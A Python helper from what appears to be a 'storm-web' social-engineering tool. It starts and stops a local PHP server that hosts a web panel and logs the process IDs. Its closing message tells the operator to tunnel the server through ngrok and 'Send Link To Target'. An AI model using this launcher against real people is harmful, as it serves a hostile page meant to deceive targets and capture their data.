from colorama import Fore,Back,Style
import subprocess,json,time,hashlib,os
import platform

def ensure_log_directory():
    log_dir = "storm-web/log"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

def kill_php_proc():
    try:
        with open("storm-web/Settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
            pid = data.get("pid", [])

        if platform.system() == "Windows":
            for process_id in pid:
                try:
                    subprocess.run(["taskkill", "/F", "/PID", str(process_id)], 
                                 capture_output=True, 
                                 check=True)
                except subprocess.CalledProcessError:
                    print(f"Process {process_id} not found or already terminated")
        else:
            for process_id in pid:
                try:
                    subprocess.getoutput(f"kill -9 {process_id}")
                except:
                    print(f"Process {process_id} not found or already terminated")

        # Clear PID list
        data["pid"] = []
        with open("storm-web/Settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)

    except Exception as e:
        print(f"Error in kill_php_proc: {e}")



def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result



def run_php_server(port):
    try:
        ensure_log_directory()
        
        log_file = f"storm-web/log/php-{md5_hash().hexdigest()}.log"
        with open(log_file, "w") as php_log:
            if platform.system() == "Windows":
                proc = subprocess.Popen(
                    ["php", "-S", f"localhost:{port}", "-t", "storm-web"],
                    stderr=php_log,
                    stdout=php_log,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                )
            else:
                proc = subprocess.Popen(
                    ("php", "-S", f"localhost:{port}", "-t", "storm-web"),
                    stderr=php_log,
                    stdout=php_log
                )
            proc_info = proc.pid

        # Update settings with new PID
        try:
            with open("storm-web/Settings.json", "r") as jsonFile:
                data = json.load(jsonFile)
        except FileNotFoundError:
            data = {"pid": []}
        
        data["pid"].append(proc_info)
        
        with open("storm-web/Settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)

        print(Fore.RED + " [+] " + Fore.GREEN + "Web Panel Link : " + Fore.WHITE + f"http://localhost:{port}")
        print(Fore.RED + "\n [+] " + Fore.LIGHTCYAN_EX + f"Please Run NGROK On Port {port} AND Send Link To Target > " + Fore.YELLOW + Back.BLACK + f"ngrok http {port}\n" + Style.RESET_ALL)
        
    except Exception as e:
        print(f"Error starting PHP server: {e}")
        print("Make sure PHP is installed and added to your PATH")
        print("You can download PHP from: https://windows.php.net/download/")


